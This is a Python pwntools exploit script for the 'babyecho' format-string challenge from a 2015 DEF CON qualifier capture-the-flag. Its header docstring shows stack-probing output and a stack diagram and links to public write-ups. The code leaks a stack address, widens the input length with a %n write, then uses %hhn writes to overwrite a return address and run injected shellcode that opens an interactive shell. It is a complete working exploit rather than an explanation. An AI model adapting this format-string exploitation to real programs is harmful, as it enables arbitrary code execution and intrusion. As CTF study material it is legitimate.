#!/usr/bin/env python
# coding: UTF-8

'''
$ ./babyecho 
Reading 13 bytes
%p%p%p%p
0xd0xa(nil)0xd
Reading 13 bytes
aaaa%5$p
aaaa0xff96573c
Reading 13 bytes
aaaa%6$p        
aaaa(nil)
Reading 13 bytes
aaaa%7$p
aaaa0x61616161

 -------------------------------- esp + 0x04
| 0xd(printf arg)　　            |
 -------------------------------- esp + 0x08
| 0xa(const)                     |
 -------------------------------- esp + 0x0c
| 0x0                            |
 -------------------------------- esp + 0x10
| 0xd(read buffer size)          |
 -------------------------------- esp + 0x14
| 0xff96573c (begin buffer size) |
 -------------------------------- esp + 0x18
| 0x0                            |
 -------------------------------- esp + 0x1c
| 0x616161 (buffer)              |
 --------------------------------

$ for i in `seq 1 200`; do echo -e "$i:0x%$i\$x" | ./babyecho; done | grep -v Reading | grep -v '0x0$'

very good writeup
http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/
https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
'''

from pwn import *

context.log_level = 'debug'

p = process('./babyecho')

p.recvline_regex('Reading \d+ bytes\n') # 13 bytes

p.sendline('%5$p') # get read buffer size (esp+0x10)
addr_buf = int(p.recvline(keepends=False), 16)

p.recvline_regex('Reading \d+ bytes\n') # 13 bytes
p.sendline(p32(addr_buf - 0xb) + '%7$n') # bit shift

p.recvline_regex('.*Reading \d+ bytes\n') # 1023 bytes

esp = addr_buf - 0x1c

payload = ''
payload += p32(esp + 0x18) # $7
payload += p32(esp + 0x42c) # $8
payload += p32(esp + 0x42c + 1) # $9
payload += p32(esp + 0x42c + 2) # $10
payload += p32(esp + 0x42c + 3) # $11
ptr = esp + 0x1c + len(payload)
payload += asm(shellcraft.sh())
initial_len = len(payload)
payload += '%7$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[0]) -      initial_len) % 0x100 + 0x100)) + '%8$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[1]) - ord(p32(ptr)[0])) % 0x100 + 0x100)) + '%9$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[2]) - ord(p32(ptr)[1])) % 0x100 + 0x100)) + '%10$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[3]) - ord(p32(ptr)[2])) % 0x100 + 0x100)) + '%11$hhn'
p.sendline(payload)

p.sendline('ls')
p.interactive()
